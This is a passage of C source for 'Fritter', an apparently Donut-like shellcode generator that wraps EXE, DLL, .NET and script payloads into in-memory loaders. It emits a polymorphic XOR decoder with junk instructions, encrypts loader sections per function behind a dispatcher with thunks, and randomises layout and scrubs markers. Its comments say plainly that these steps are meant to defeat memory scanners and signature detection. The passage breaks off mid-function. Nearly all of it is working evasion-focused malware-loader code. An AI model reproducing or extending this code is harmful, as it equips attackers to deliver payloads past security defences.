        db[ds++] = 0x48 | (rDP.rex << 2) | rDP.rex; db[ds++] = 0x8D; \
        db[ds++] = 0x40 | (rDP.reg3 << 3) | rDP.reg3; db[ds++] = 4; \
      } \
    } while(0)

    // state ^= state << a; state ^= state >> b; state ^= state << c
    for(int st = 0; st < 3; st++) {
      uint8_t rex, form;
      DREG    rT = rTs[st];
      if(loop_order == st) { EMIT_INC_DP(); EMIT_JUNK(); }
      gen_random(&form, 1);
      // mov temp, state (either encoding)
      if(form & 1) {
        rex = (uint8_t)((rK.rex << 2) | rT.rex);
        if(rex) db[ds++] = 0x40 | rex;
        db[ds++] = 0x89; db[ds++] = 0xC0 | (rK.reg3 << 3) | rT.reg3;
      } else {
        rex = (uint8_t)((rT.rex << 2) | rK.rex);
        if(rex) db[ds++] = 0x40 | rex;
        db[ds++] = 0x8B; db[ds++] = 0xC0 | (rT.reg3 << 3) | rK.reg3;
      }
      if(rT.rex) db[ds++] = 0x41;
      db[ds++] = 0xC1; db[ds++] = ((st == 1) ? 0xE8 : 0xE0) | rT.reg3;   // shl/shr temp, n
      db[ds++] = outer.sh[st];
      // xor state, temp (either encoding)
      if(form & 2) {
        rex = (uint8_t)((rT.rex << 2) | rK.rex);
        if(rex) db[ds++] = 0x40 | rex;
        db[ds++] = 0x31; db[ds++] = 0xC0 | (rT.reg3 << 3) | rK.reg3;
      } else {
        rex = (uint8_t)((rK.rex << 2) | rT.rex);
        if(rex) db[ds++] = 0x40 | rex;
        db[ds++] = 0x33; db[ds++] = 0xC0 | (rK.reg3 << 3) | rT.reg3;
      }
      if(st < 2) EMIT_JUNK();
    }
    if(loop_order == 3) EMIT_INC_DP();
    // Junk before DEC is fine: DEC overwrites the flags of anything before
    // it. DEC+JNZ must stay adjacent.
    EMIT_JUNK();

    // dec counter_32 + jnz loop (atomic pair - JNZ reads flags from DEC)
    if(rCNT.rex) db[ds++] = 0x41;
    db[ds++] = 0xFF;
    db[ds++] = 0xC8 | rCNT.reg3; // DEC r32
    // jnz (placeholder - patched in pass 2)
    db[ds++] = 0x75;
    fixup_offset[FIXUP_JNZ] = ds;

    ds += 1; // placeholder rel8
    fixup_end[FIXUP_JNZ] = ds;
    EMIT_JUNK();

    // pop rcx (restore instance pointer), then fall into the trampoline
    db[ds++] = 0x59;
    EMIT_JUNK();

    uint32_t decoder_stub_size = ds;

    // --- Compute page alignment padding ---
    // The combined blob (shim+loader) must start at a page-aligned address.
    // VirtualAlloc gives 64KB-aligned memory, so we just need the offset from
    // PIC start to be a multiple of 4096.
    // Between decoder and encoded data: [trampoline (variable size)] [page_pad]
    // Prefix is pure junk fall-through - no header bytes, just pfx_len of payload.
    uint32_t pre_blob_size = pfx_len + 5 + c->inst_len + 1 + junk_mid_len +
                             rsp_align_size + decoder_stub_size + tramp_size;
    uint32_t page_pad = (4096 - (pre_blob_size & 0xFFF)) & 0xFFF;
    DPRINT("Page alignment: pre_blob=%d, page_pad=%d, total_offset=%d",
           pre_blob_size, page_pad, pre_blob_size + page_pad);

    // Patch trampoline displacements now that page_pad is known.
    // Shim entry sits at: trampoline_start + tramp_size + page_pad
    //   LEA RIP-rel target = (trampoline_start + 7) + lea_disp = shim_entry
    //   → lea_disp = (tramp_size - 7) + page_pad
    //   JMP rel32 target  = (trampoline_start + tramp_size) + jmp_disp = shim_entry
    //   → jmp_disp = page_pad
    {
      int32_t lea_disp = (int32_t)(tramp_size - 7) + (int32_t)page_pad;
      memcpy(tramp_buf + tramp_lea_disp_off, &lea_disp, 4);
      if (!tramp_jmp_indirect) {
        int32_t jmp_disp = (int32_t)page_pad;
        memcpy(tramp_buf + tramp_jmp_disp_off, &jmp_disp, 4);
      }
    }

    // --- Pass 2: patch displacements ---
    {
      // LEA data_ptr: target past trampoline + page_pad = start of encoded data
      int32_t d = (int32_t)(decoder_stub_size + tramp_size + page_pad) - fixup_end[FIXUP_DATA];
      memcpy(db + fixup_offset[FIXUP_DATA], &d, 4);

      // JNZ: target = loop_start, from = fixup_end[FIXUP_JNZ]
      int8_t jnz_disp = (int8_t)(loop_start - fixup_end[FIXUP_JNZ]);
      db[fixup_offset[FIXUP_JNZ]] = (uint8_t)jnz_disp;
    }

    DPRINT("Polymorphic decoder: %d bytes (regs: dp=%d cnt=%d k=%d t=%d) "
           "shifts=%u,%u,%u order=%d",
           decoder_stub_size, rDP.reg3, rCNT.reg3, rK.reg3, rTs[0].reg3,
           outer.sh[0], outer.sh[1], outer.sh[2], loop_order);

    // --- Dispatch shim integration (replaces VEH shim) ---
    // Page-pad the shim so the loader starts on a page boundary
    // (VirtualAlloc allocates on 64KB boundaries, so absolute page alignment is guaranteed)
    uint32_t shim_raw_size = sizeof(DISPATCH_SHIM_EXE_X64);
    uint32_t shim_padded_size = (shim_raw_size + 0xFFF) & ~0xFFF;  // round up to 4096
    DPRINT("Dispatch shim: %d bytes raw, %d bytes padded", shim_raw_size, shim_padded_size);

    // --- N>1 dispatch mode gating ---
    // When the loader has multiple PE code sections (post-packer), engage
    // per-function dispatch: append a dispatcher + one thunk per
    // cross-section call to protected sections at the loader-blob tail.
    // A single-section loader falls through to v1 whole-loader dispatch.
    int use_ngt1 = (L_FN_COUNT > 1);
    int is_resident[SHIM_MAX_FN_COUNT] = {0};

    /* Validate the exe2h companion tables before trusting them. N>1 adds
       one tail entry, so the loader may have at most MAX-1 sections. */
    if(L_FN_COUNT == 0 || L_FN_COUNT + (use_ngt1 ? 1u : 0u) > SHIM_MAX_FN_COUNT) {
      DPRINT("ERROR: loader has %u code sections; shim fn table holds %u",
             L_FN_COUNT, SHIM_MAX_FN_COUNT);
      return FRITTER_ERROR_INVALID_PARAMETER;
    }
    if(use_ngt1) {
      int has_resident = 0;
      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
        if(L_FNS[i].size == 0 || L_FNS[i].offset > loader_size ||
           L_FNS[i].size > loader_size - L_FNS[i].offset) {
          DPRINT("ERROR: fn[%u] range 0x%x+0x%x is outside the %u-byte loader",
                 i, L_FNS[i].offset, L_FNS[i].size, loader_size);
          return FRITTER_ERROR_INVALID_PARAMETER;
        }
        if(strncmp(L_FNS[i].name, ".text", 5) == 0) has_resident = 1;
      }
      for(uint32_t i = 0; i < L_REF_COUNT; i++) {
        if(L_REFS[i].target_fn >= L_FN_COUNT || L_REFS[i].src_fn >= L_FN_COUNT ||
           L_REFS[i].src_blob_off + L_REFS[i].inst_length > loader_size) {
          DPRINT("ERROR: ref[%u] is out of range", i);
          return FRITTER_ERROR_INVALID_PARAMETER;
        }
        /* A thunk can only stand in for a CALL/JMP rel32. A Jcc or a data
           reference into a protected section cannot be dispatched. */
        if(strncmp(L_FNS[L_REFS[i].target_fn].name, ".text", 5) != 0) {
          uint8_t op = ((const uint8_t*)loader_blob)[L_REFS[i].src_blob_off];
          if(L_REFS[i].disp_offset != 1 || (op != 0xE8 && op != 0xE9)) {
            DPRINT("ERROR: ref[%u] into a protected section is not a call", i);
            return FRITTER_ERROR_INVALID_PARAMETER;
          }
        }
      }
      if(!has_resident || L_REF_COUNT == 0) {
        DPRINT("ERROR: multi-section loader without a resident .text or without refs");
        return FRITTER_ERROR_INVALID_PARAMETER;
      }
    }
    uint32_t protected_ref_count = 0;
    uint32_t disp_slot  = 0;
    uint32_t thunks_size = 0;
    uint32_t pre_disp_pad = 0;  /* random 0..63 bytes before dispatcher */
    int      input_swap  = 0;   /* r10/r11 semantic role, thunk+dispatcher agree */
    if(use_ngt1) {
      /* Residency policy: only .text (FritterLoader + MainProcEntry +
         untagged helpers) stays resident because the shim jmps to its
         entry directly and Windows calls MainProcEntry via CreateThread.
         .main_pr is now protected, MainProcEntry's cross-section call
         to MainProc gets thunkified by the rewriter. */
      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
        if(strncmp(L_FNS[i].name, ".text", 5) == 0) {
          is_resident[i] = 1;
        }
      }
      for(uint32_t i = 0; i < L_REF_COUNT; i++) {
        if(!is_resident[L_REFS[i].target_fn]) protected_ref_count++;
      }
      disp_slot  = DISPATCHER_MAX_SIZE;
      thunks_size = protected_ref_count * THUNK_SIZE;
      /* Structural jitter: 0..63 random bytes between loader end and
         dispatcher entry. Kills the "dispatcher always at loader+0"
         relative offset that a memory scan could otherwise anchor on. */
      uint8_t pad_rnd;
      gen_random(&pad_rnd, 1);
      pre_disp_pad = pad_rnd & 0x3F;
      /* Per-build coin flip: which of r10/r11 carries target_off vs
         callee_id. Kills the fixed "add rax, r10" / "mov r12d, r11d"
         ModR/M bytes in the dispatcher. */
      uint8_t swap_rnd;
      gen_random(&swap_rnd, 1);
      input_swap = swap_rnd & 1;
      DPRINT("N>1 dispatch: FN_COUNT=%u REF_COUNT=%u protected_refs=%u pre_disp_pad=%u disp_slot=%u thunks=%u",
             L_FN_COUNT, L_REF_COUNT, protected_ref_count, pre_disp_pad, disp_slot, thunks_size);
    }
    uint32_t tail_extra = pre_disp_pad + disp_slot + thunks_size;
    // Mask stub: padding up to the next page, then the stub's own page.
    uint32_t mask_extra = 0;
    if(use_ngt1 && MASK_STUB_BUILT) {
      mask_extra = ((0u - (shim_padded_size + loader_size + tail_extra)) & 0xFFFu) + MASK_PAGE;
    }

    // Build combined blob: [shim (page-padded)] [loader] [tail_extra when N>1] [mask stub]
    uint32_t combined_size = shim_padded_size + loader_size + tail_extra + mask_extra;
    // the outer decoder works in dwords
    uint32_t dword_pad = (0u - combined_size) & 3u;
    combined_size += dword_pad;
    uint8_t *combined = malloc(combined_size);
    if(combined == NULL) {
      return FRITTER_ERROR_NO_MEMORY;
    }
    if(dword_pad) gen_random(combined + combined_size - dword_pad, dword_pad);

    // Copy shim, pad with random bytes (not zeros - looks more natural)
    memcpy(combined, DISPATCH_SHIM_EXE_X64, shim_raw_size);
    if(shim_padded_size > shim_raw_size) {
      gen_random(combined + shim_raw_size, shim_padded_size - shim_raw_size);
    }

    // Exit stub: somewhere in the shim's page padding (never wiped, and
    // encoded at rest like the shim). Point the RSP-align epilogue at it.
    {
      uint8_t  xs[96];
      uint32_t xs_len = emit_exit_stub(xs);
      uint32_t room   = shim_padded_size - shim_raw_size;
      uint32_t xr;
      if(room < xs_len) {
        DPRINT("ERROR: no room for the exit stub (%u < %u)", room, xs_len);
        free(combined);
        return FRITTER_ERROR_NO_MEMORY;
      }
      gen_random(&xr, sizeof(xr));
      uint32_t xs_off  = shim_raw_size + xr % (room - xs_len + 1);
      uint32_t rsp_pos = pfx_len + 5 + c->inst_len + 1 + junk_mid_len;
      int32_t  xd      = (int32_t)(pre_blob_size + page_pad + xs_off)
                       - (int32_t)(rsp_pos + rsp_exit_disp_off + 4);
      memcpy(combined + xs_off, xs, xs_len);
      memcpy(rsp_buf + rsp_exit_disp_off, &xd, 4);
      DPRINT("Exit stub: %u bytes at shim+%u", xs_len, xs_off);
    }

    // Patch dispatch shim sentinels (in shim portion of combined):
    //   SENTINEL_LOADER_OFFSET (0xDEAD0001) -> shim_padded_size
    //   SENTINEL_LOADER_SIZE   (0xDEAD0002) -> loader_size
    // VEH_MODE and PAGE_KEY_* sentinels are retired under dispatch.
    {
      int patched_off = 0, patched_sz = 0, patched_pic = 0;
      uint32_t pic_to_shim = pre_blob_size + page_pad;
      for(uint32_t i = 0; i < shim_raw_size - 3; i++) {
        uint32_t val;
        memcpy(&val, combined + i, 4);
        if(val == 0xDEAD0001 && !patched_off) {
          memcpy(combined + i, &shim_padded_size, 4);
          patched_off = 1;
          DPRINT("Patched SENTINEL_LOADER_OFFSET at shim+%d -> %d", i, shim_padded_size);
        } else if(val == 0xDEAD0002 && !patched_sz) {
          memcpy(combined + i, &loader_size, 4);
          patched_sz = 1;
          DPRINT("Patched SENTINEL_LOADER_SIZE at shim+%d -> %d", i, loader_size);
        } else if(val == 0xDEAD0003 && !patched_pic) {
          memcpy(combined + i, &pic_to_shim, 4);
          patched_pic = 1;
        }
      }
      if(!patched_off || !patched_sz || !patched_pic) {
        DPRINT("ERROR: Failed to patch dispatch shim sentinels (off=%d, sz=%d)",
               patched_off, patched_sz);
        free(combined);
        return FRITTER_ERROR_NO_MEMORY;
      }
    }

    // Locate the fn table by marker scan.
    //   marker  @ +0..7   (F1 7E 7A B1 F1 7E 7A B1, little-endian)
    //   count   @ +8..11  (patched below per mode)
    //   pad     @ +12..15
    //   entry[i] @ +16 + i*12 : {offset, size, key, flags, pad}
    uint32_t ft_off = 0;
    {
      static const uint8_t FN_MARKER[8] = {
        0xB1, 0x7A, 0x7E, 0xF1, 0xB1, 0x7A, 0x7E, 0xF1
      };
      int marker_found = 0;
      for(uint32_t i = 0; i + 8 <= shim_raw_size; i++) {
        if(memcmp(combined + i, FN_MARKER, 8) == 0) {
          ft_off = i;
          marker_found = 1;
          break;
        }
      }
      if(!marker_found) {
        DPRINT("ERROR: dispatch shim fn table marker not found");
        free(combined);
        return FRITTER_ERROR_NO_MEMORY;
      }
      DPRINT("fn table marker at shim+%u", ft_off);
    }

    // Copy loader after padded shim. XOR-encryption happens per mode below.
    memcpy(combined + shim_padded_size, loader_blob, loader_size);

    if(use_ngt1) {
      // --- N>1 per-function dispatch mode ---
      //
      // Layout after this block:
      //   combined = [shim (padded)] [loader (with rewritten disps and
      //              XOR'd protected sections)] [dispatcher_bytes]
      //              [thunk_0..thunk_N-1]
      //
      // Runtime:
      //   1. Outer decoder unwraps combined → plaintext at rest state
      //   2. Shim's decrypt loop skips ALL entries (none have SHIM_DECRYPT)
      //   3. Shim calls loader_base = start of .text (RESIDENT, plaintext)
      //   4. FritterLoader executes; cross-section calls now go to thunks
      //   5. Each thunk: mov r10=target_off; mov r11=callee_id; jmp dispatcher
      //   6. Dispatcher: XOR-decrypts callee slab, calls it, re-encrypts
      //   7. FritterLoader returns to shim → shim wipes loader region

      // Random-fill tail area so the dispatcher slot's unused suffix and
      // any post-thunk padding look like the rest of the encoded region.
      if(tail_extra + mask_extra > 0) {
        gen_random(combined + shim_padded_size + loader_size, tail_extra + mask_extra);
      }
      if(mask_extra != 0 &&
         !emit_mask_page(combined + combined_size - MASK_PAGE, combined_size - MASK_PAGE)) {
        free(combined);
        return FRITTER_ERROR_RANDOM;
      }

      // Emit dispatcher after pre_disp_pad bytes of random junk. The
      // padding sits inside the RESIDENT tail entry so nothing tries to
      // decrypt it; its bytes came from gen_random above.
      uint32_t disp_off_in_blob   = shim_padded_size + loader_size + pre_disp_pad;
      uint32_t loader_off_in_blob = shim_padded_size;
      fn_stream_t stream;
      {
        uint8_t sr[2];
        gen_random(sr, 2);
        memcpy(stream.sh, XS_TRIPLES[sr[0] % 36], 3);
        stream.rev = sr[1] & 1;
      }
      uint32_t actual_disp_size = emit_dispatcher(combined + disp_off_in_blob,
                                                   disp_off_in_blob,
                                                   loader_off_in_blob,
                                                   ft_off,
                                                   input_swap,
                                                   &stream);
      if(actual_disp_size > DISPATCHER_MAX_SIZE) {
        DPRINT("ERROR: dispatcher emitted %u bytes > slot %u",
               actual_disp_size, DISPATCHER_MAX_SIZE);
        free(combined);
        return FRITTER_ERROR_NO_MEMORY;
      }
      DPRINT("Dispatcher: %u bytes at blob+%u (slot %u)",
             actual_disp_size, disp_off_in_blob, DISPATCHER_MAX_SIZE);

      // Emit thunks + rewrite loader disps for each protected-target ref.
      // Thunks live at blob+shim_padded+loader_size+DISPATCHER_MAX_SIZE+i*THUNK_SIZE
      // (so thunk_i's loader-relative offset is loader_size+DISPATCHER_MAX_SIZE+i*THUNK_SIZE).
      uint32_t thunk_i = 0;
      for(uint32_t r = 0; r < L_REF_COUNT; r++) {
        if(is_resident[L_REFS[r].target_fn]) continue;

        // Reconstruct target_blob_off from the packer's disp32 currently
        // in the loader blob (fritter has this from exe2h emission already,
        // but reading the disp keeps ref_t compact).
        int32_t current_disp;
        memcpy(&current_disp,
               combined + shim_padded_size + L_REFS[r].src_blob_off + L_REFS[r].disp_offset,
               4);
        uint32_t target_blob_off = (uint32_t)((int32_t)L_REFS[r].src_blob_off
                                              + L_REFS[r].inst_length
                                              + current_disp);

        uint32_t thunk_off_in_loader = loader_size + pre_disp_pad
                                       + DISPATCHER_MAX_SIZE
                                       + thunk_i * THUNK_SIZE;
        uint32_t thunk_off_in_blob   = shim_padded_size + thunk_off_in_loader;

        // Dispatcher is at disp_off_in_blob. rel32 from end-of-jmp
        // (thunk_off_in_blob + THUNK_SIZE) to dispatcher entry.
        int32_t dispatcher_rel = (int32_t)disp_off_in_blob
                                 - (int32_t)(thunk_off_in_blob + THUNK_SIZE);

        emit_thunk(combined + thunk_off_in_blob,
                   target_blob_off,
                   L_REFS[r].target_fn,
                   dispatcher_rel,
                   input_swap);

        // Rewrite the loader's disp32 so the original CALL/JMP now targets
        // this thunk. disp is loader-relative because both src and thunk
        // are in the loader region (post shim, pre outer-encode).
        int32_t new_disp = (int32_t)thunk_off_in_loader
                           - (int32_t)((int32_t)L_REFS[r].src_blob_off + L_REFS[r].inst_length);
        memcpy(combined + shim_padded_size + L_REFS[r].src_blob_off + L_REFS[r].disp_offset,
               &new_disp, 4);

        thunk_i++;
      }
      if(thunk_i != protected_ref_count) {
        DPRINT("ERROR: emitted %u thunks, expected %u", thunk_i, protected_ref_count);
        free(combined);
        return FRITTER_ERROR_NO_MEMORY;
      }
      DPRINT("Emitted %u thunks; rewrote %u disps", thunk_i, thunk_i);

      // Populate multi-entry fn_table + XOR-encrypt each protected section.
      uint32_t new_count = L_FN_COUNT + 1;
      memcpy(combined + ft_off + 8, &new_count, 4);
      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
        uint32_t e_off = L_FNS[i].offset;
        uint32_t e_sz  = L_FNS[i].size;
        uint8_t  e_key[4] = {0, 0, 0, 0};
        uint32_t e_seed = 0;
        uint8_t  e_flags;
        if(is_resident[i]) {
          e_flags = 0x01;  /* FN_FLAG_RESIDENT */
        } else {
          /* The dispatcher loads the seed as the dword at +8, which
             includes the flags byte: that byte is 0 for these entries. */
          int tries = 0;
          do {
            if(!gen_random(e_key, 4) || ++tries > 1000) { free(combined); return FRITTER_ERROR_RANDOM; }
            e_key[1] = 0;
            memcpy(&e_seed, e_key, 4);
          } while(e_key[0] == 0 || !fn_stream_xor(NULL, e_sz, e_seed, &stream, 0));
          e_flags = 0x00;  /* dispatcher-managed */
          fn_stream_xor(combined + shim_padded_size + e_off, e_sz, e_seed, &stream, 1);
        }
        uint8_t *entry = combined + ft_off + 16 + i * 12;
        memcpy(entry + 0, &e_off, 4);
        memcpy(entry + 4, &e_sz,  4);
        entry[8]  = e_key[0];
        entry[9]  = e_flags;
        entry[10] = e_key[2];
        entry[11] = e_key[3];
        DPRINT("  fn[%u] name=%-9.*s off=0x%05x size=0x%04x seed=0x%08x flags=0x%02x",
               i, 8, L_FNS[i].name, e_off, e_sz, e_seed, e_flags);
      }
      // Trailing entry covers the dispatcher + thunks region as RESIDENT
      // so the shim's (no-op) decrypt loop skips it and the dispatcher
      // doesn't try to crypt it either.
      uint32_t tail_e_off = loader_size;
      // (the mask stub page too: the shim wipes and unprotects up to its end)
      uint32_t tail_e_sz  = pre_disp_pad + DISPATCHER_MAX_SIZE + thunks_size + mask_extra;
      uint8_t *tail_entry = combined + ft_off + 16 + L_FN_COUNT * 12;
      memcpy(tail_entry + 0, &tail_e_off, 4);
      memcpy(tail_entry + 4, &tail_e_sz,  4);
      tail_entry[8]  = 0;
      tail_entry[9]  = 0x01;  /* RESIDENT */
      tail_entry[10] = 0;
      tail_entry[11] = 0;
      DPRINT("  fn[%u] tail (dispatch+thunks) off=0x%05x size=0x%04x RESIDENT",
             L_FN_COUNT, tail_e_off, tail_e_sz);
      DPRINT("N>1 fn_table populated: count=%u", new_count);

    } else {
      // --- v1 whole-loader dispatch mode ---
      // Single fn_table entry covers the loader; shim auto-decrypts.
      uint8_t fn_key = 0;
      do {
        if(!gen_random(&fn_key, 1)) { free(combined); return FRITTER_ERROR_RANDOM; }
      } while(fn_key == 0);

      uint32_t one = 1;
      memcpy(combined + ft_off + 8, &one, 4);
      uint32_t e_off = 0, e_sz = loader_size;
      uint8_t  e_flags = 0x02;  /* FN_FLAG_SHIM_DECRYPT */
      memcpy(combined + ft_off + 16 + 0, &e_off, 4);
      memcpy(combined + ft_off + 16 + 4, &e_sz,  4);
      combined[ft_off + 16 + 8]  = fn_key;
      combined[ft_off + 16 + 9]  = e_flags;
      combined[ft_off + 16 + 10] = 0x00;
      combined[ft_off + 16 + 11] = 0x00;
      DPRINT("Patched fn table: count=1 entry[0]={offset=0 size=%u key=0x%02X flags=0x%02X}",
             loader_size, fn_key, e_flags);

      // XOR-encrypt the whole loader region with the per-fn key.
      for(uint32_t i = 0; i < loader_size; i++) {
        combined[shim_padded_size + i] ^= fn_key;
      }
      DPRINT("XOR-encrypted loader region (%u bytes) with fn key 0x%02X",
             loader_size, fn_key);
    }

    /* Overwrite the fn_table marker (F1 7E 7A B1 x2) with random bytes.
       Marker was only needed at build time to locate the table for
       patching. Leaving it intact would give runtime memory scans a
       stable 8-byte anchor at a known relative offset within the shim. */
    gen_random(combined + ft_off, 8);
    DPRINT("Scrambled fn_table marker at shim+%u", ft_off);

    // Outer decoder wraps the WHOLE combined blob (shim + fn-encrypted loader).
    uint8_t *encoded = malloc(combined_size);
    if(encoded == NULL) {
      free(combined);
      return FRITTER_ERROR_NO_MEMORY;
    }

    {
      uint32_t dwords = combined_size / 4;
      memcpy(db + counter_imm_offset, &dwords, 4);
    }
    DPRINT("Patched decoder counter: %d -> %d (shim %d + loader %d)",
           loader_size, combined_size, shim_padded_size, loader_size);

    {
      uint32_t k = outer_seed, w;
      for(uint32_t i = 0; i < combined_size; i += 4) {
        memcpy(&w, combined + i, 4);
        w ^= k;
        memcpy(encoded + i, &w, 4);
        k ^= k << outer.sh[0];
        k ^= k >> outer.sh[1];
        k ^= k << outer.sh[2];
      }
    }
    free(combined);

    // --- Calculate total PIC size ---
    // Layout: [pfx_buf fall-through] [CALL 5B] [instance] [POP 1B] [junk_mid]
    //         [rsp_align] [decoder_stub] [lea rdx 7B] [jmp rel32 5B] [page_pad]
    //         [encoded(shim+loader)]
    c->pic_len = pre_blob_size + page_pad + combined_size;

    // Tell the loader where it sits, so it can drop write/execute access
    // from its own pages while the payload runs. Both fields are in the
    // plaintext head of the instance.
    ((PFRITTER_INSTANCE)c->inst)->pic_off = pfx_len + 5;
    ((PFRITTER_INSTANCE)c->inst)->pic_len = c->pic_len;
    {
      PFRITTER_INSTANCE pi = (PFRITTER_INSTANCE)c->inst;
      pi->exit_opt ^= FRITTER_PLAIN_MASK(pi, 0);
      pi->entropy  ^= FRITTER_PLAIN_MASK(pi, 1);
      pi->oep      ^= FRITTER_PLAIN_MASK(pi, 2);
      pi->pic_off  ^= FRITTER_PLAIN_MASK(pi, 3);
      pi->pic_len  ^= FRITTER_PLAIN_MASK(pi, 4);
    }

    c->pic = malloc(c->pic_len);
    if(c->pic == NULL) {
      free(encoded);
      return FRITTER_ERROR_NO_MEMORY;
    }

    DPRINT("Total PIC size: %" PRId32 " bytes", c->pic_len);

    pl = (uint8_t*)c->pic;

    // --- Feature 2A: Junk fall-through prefix ---
    if(pfx_len > 0) {
      PUT_BYTES(pl, pfx_buf, pfx_len);
    }

    // call $ + c->inst_len (call over instance data)
    PUT_BYTE(pl,  0xE8);
    PUT_WORD(pl,  c->inst_len);
    PUT_BYTES(pl, c->inst, c->inst_len);
    // pop rcx
    PUT_BYTE(pl,  0x59);

    // --- Feature 2C: Junk between POP and RSP_ALIGN ---
    if(junk_mid_len > 0) {
      PUT_BYTES(pl, junk_mid, junk_mid_len);
    }

    // --- Feature 2B: RSP alignment ---
    PUT_BYTES(pl, rsp_align, rsp_align_size);

    // --- Decoder stub + generative trampoline + page padding + encoded(shim + loader) ---
    PUT_BYTES(pl, db, decoder_stub_size);
    PUT_BYTES(pl, tramp_buf, tramp_size);

    // Page alignment padding (random bytes, never executed)
    if(page_pad > 0) {
      uint8_t *pad_buf = malloc(page_pad);
      if(pad_buf) {
        gen_random(pad_buf, page_pad);
        PUT_BYTES(pl, pad_buf, page_pad);
        free(pad_buf);
      }
    }

    PUT_BYTES(pl, encoded, combined_size);

    free(encoded);

    DPRINT("PIC built successfully");
    return FRITTER_ERROR_OK;
}

/**
 * Function: validate_loader_cfg
 * ----------------------------
 *   Validates Fritter configuration for loader.
 *
 *   INPUT  : Pointer to a Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int validate_loader_cfg(PFRITTER_CONFIG c) {
    DPRINT("Validating loader configuration.");
    
    if(c == NULL || c->input[0] == 0) {
      DPRINT("No configuration or input file provided.");
      return FRITTER_ERROR_INVALID_PARAMETER;
    }

    if(c->format < FRITTER_FORMAT_BINARY || c->format > FRITTER_FORMAT_UUID) {
      DPRINT("Format type %" PRId32 " is invalid.", c->format);
      return FRITTER_ERROR_INVALID_FORMAT;
    }
    
    if(c->entropy != FRITTER_ENTROPY_NONE   &&
       c->entropy != FRITTER_ENTROPY_RANDOM &&
       c->entropy != FRITTER_ENTROPY_DEFAULT)
    {
      DPRINT("Entropy level %" PRId32 " is invalid.", c->entropy);
      return FRITTER_ERROR_INVALID_ENTROPY;
    }
    
    if(c->arch != FRITTER_ARCH_X64)
    {
      DPRINT("Only x64 architecture is supported. Got %"PRId32, c->arch);
      return FRITTER_ERROR_INVALID_ARCH;
    }
    
    if(c->headers != FRITTER_HEADERS_OVERWRITE     &&
       c->headers != FRITTER_HEADERS_KEEP)
    {
      DPRINT("Option to preserve PE headers (or not) %"PRId32" is invalid.", c->headers);
      return FRITTER_ERROR_HEADERS_INVALID;
    }
    
    DPRINT("Loader configuration passed validation.");
    return FRITTER_ERROR_OK;
}

/**
 * Function: is_dll_export
 * ----------------------------
 *   Validates if a DLL exports a function. 
 *
 *   INPUT  : Name of DLL function to check.
 *
 *   OUTPUT : 1 if found, else 0
 */
static int is_dll_export(const char *function) {
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD                   rva, cnt;
    PDWORD                  sym;
    PCHAR                   str;
    size_t                  flen = strlen(function);
    int                     found = 0;

    DPRINT("Entering.");
    
    dir = Dirs(fi.data);
    if(dir != NULL) {
      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
      DPRINT("EAT VA : %lx", rva);
      if(rva != 0) {
        exp = (PIMAGE_EXPORT_DIRECTORY)pe_ptr(fi.data, fi.len, rva, sizeof(IMAGE_EXPORT_DIRECTORY));
        if(exp != NULL) {
          cnt = exp->NumberOfNames;
          DPRINT("Number of exported functions : %lx", cnt);
          
          // the whole name-pointer array must be inside the file
          sym = (cnt == 0) ? NULL :
            (PDWORD)pe_ptr(fi.data, fi.len, exp->AddressOfNames, (uint64_t)cnt * sizeof(DWORD));
          
          if(sym != NULL) {
            // scan array for symbol
            do {
              // name plus its terminator must be inside the file
              str = (PCHAR)pe_ptr(fi.data, fi.len, sym[cnt - 1], (uint64_t)flen + 1);
              // if match found, exit
              if(str != NULL && memcmp(str, function, flen + 1) == 0) {
                DPRINT("Found API");
                found = 1;
                break;
              }
            } while (--cnt);
          }
        }
      }
    }
    DPRINT("Leaving.");
    return found;
}

/**
 * Function: validate_file_cfg
 * ----------------------------
 *   Validates configuration for the input file.
 *
 *   INPUT  : Pointer to Fritter configuration.
 *
 *   OUTPUT : Fritter error code. 
 */
static int validate_file_cfg(PFRITTER_CONFIG c) {
    DPRINT("Validating configuration for input file.");
    
    // Unmanaged EXE/DLL?
    if(fi.type == FRITTER_MODULE_DLL ||
       fi.type == FRITTER_MODULE_EXE)
    {
      // Only x64 binaries supported
      if(fi.arch != FRITTER_ARCH_X64) {
        DPRINT("Only x64 binaries are supported. File arch: %"PRId32, fi.arch);
        return FRITTER_ERROR_ARCH_MISMATCH;
      }
      // DLL function specified. Does it exist?
      if(fi.type == FRITTER_MODULE_DLL && c->method[0] != 0)
      {
        if(!is_dll_export(c->method)) {
          DPRINT("Unable to locate function \"%s\" in DLL", c->method);
          return FRITTER_ERROR_DLL_FUNCTION;
        }
      }
    }    
    // .NET DLL assembly?
    if(fi.type == FRITTER_MODULE_NET_DLL) {
      // DLL requires class and method
      if(c->cls[0] == 0 || c->method[0] == 0) {
        DPRINT("Input file is a .NET assembly, but no class and method have been specified.");
        return FRITTER_ERROR_NET_PARAMS;
      }
    }
    
    // is this an unmanaged DLL with parameters?
    if(fi.type == FRITTER_MODULE_DLL && c->args[0] != 0) {
      // we need a DLL function
      if(c->method[0] == 0) {
        DPRINT("Parameters are provided for an unmanaged/native DLL, but no function.");
        return FRITTER_ERROR_DLL_PARAM;
      }
    }
    DPRINT("Validation passed.");
    return FRITTER_ERROR_OK;
}

/**
 * Function: FritterCreate
 * ----------------------------
 *   Builds a position-independent loader for VBS/JS/EXE/DLL files.
 *
 *   INPUT  : Pointer to a Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
EXPORT_FUNC 
int FritterCreate(PFRITTER_CONFIG c) {
    int err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    
    if(c == NULL) return FRITTER_ERROR_INVALID_PARAMETER;
    
    c->mod = c->pic = c->inst = NULL;
    c->mod_len = c->pic_len = c->inst_len = 0;
    g_rng_failed = 0;
    
    // 1. validate the loader configuration
    err = validate_loader_cfg(c);
    if(err == FRITTER_ERROR_OK) {
      // 2. get information about the file to execute in memory
      err = read_file_info(c);
      if(err == FRITTER_ERROR_OK) {
        // 3. validate the module configuration
        err = validate_file_cfg(c);
        if(err == FRITTER_ERROR_OK) {
          // 4. build the module
          err = build_module(c);
          if(err == FRITTER_ERROR_OK) {
            // 5. build the instance
            err = build_instance(c);
            if(err == FRITTER_ERROR_OK) {
              // 6. build the loader
              err = build_loader(c);
